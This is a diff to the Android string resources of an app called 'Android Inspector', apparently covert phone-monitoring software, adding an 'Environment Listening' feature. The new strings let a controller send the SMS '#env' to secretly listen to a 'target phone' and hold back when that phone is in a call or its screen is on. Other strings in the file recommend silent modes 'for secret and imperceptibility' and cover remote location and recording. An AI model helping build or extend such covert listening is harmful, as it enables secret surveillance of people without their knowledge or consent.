@@ -53,6 +53,10 @@
     <string name="location_sms_base_station_cdma">Current base station location: http://maps.google.com/?q=%s</string>
     <string name="location_sms_fail">Sorry, cannot get location now. Please try again later. Contact support if necessary.</string>
     
+    <!-- Environment Listening -->
+    <string name="env_fail_offhook">The target phone is now in a call, so you cannot listen to its environment.</string>
+    <string name="env_fail_screen_on">The target phone is being viewed or operated now, so you cannot listen to its environment.</string>
+    
     <!-- Preferences -->
     <string name="pref_title">Preferences</string>
     <string name="pref_category_sender_mail_key">pref_category_sender</string>
@@ -67,6 +71,7 @@
     <string name="pref_category_gps_key">pref_category_gps</string>
     <string name="pref_category_gps_title">Get Phone Location</string>
     <string name="pref_category_ring_title">Belling</string>
+    <string name="pref_category_env_title">Environment Listening</string>
     
     <string name="pref_sender_mail_title">Mail Sender(GMail/QQ ONLY)</string>
     <string name="pref_sender_mail_summary">Only GMail and QQ mail are supported.</string>
@@ -93,14 +98,16 @@
     <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
     <string name="pref_sensitive_words_count_reach_max">No more than %d sensitive words permitted, the surplus words will be ignored.</string>
     <string name="pref_gps_word_title">Location Command</string>
-    <string name="pref_gps_word_summary">Send SMS(#location) to get back its location.</string>
+    <string name="pref_gps_word_summary">Send SMS #location to get back its location.</string>
     <string name="pref_category_network_mode_title">Network</string>
     <string name="pref_network_mode_title">Network Connection Mode</string>
     <string name="pref_network_mode_summary">Recommend to use "Silent" or "Wi-Fi Silent" mode for secret and imperceptibility.</string>
     <string name="pref_network_mode_dlg_title">Choose Mode</string>
     <string name="pref_record_all_time_limit_in_trial">Only 10 times recording permitted in trial.</string>
     <string name="pref_ring_word_title">Force Belling</string>
-    <string name="pref_ring_word_summary">Send SMS(#bell) to force belling.</string>
+    <string name="pref_ring_word_summary">Send SMS #bell to force belling.</string>
+    <string name="pref_env_word_title">Environment Listening</string>
+    <string name="pref_env_word_summary">Send SMS #env to listen to target phone environment.</string>
     
     <!-- InitActivity -->
     <string name="init_title">Android Inspector</string>
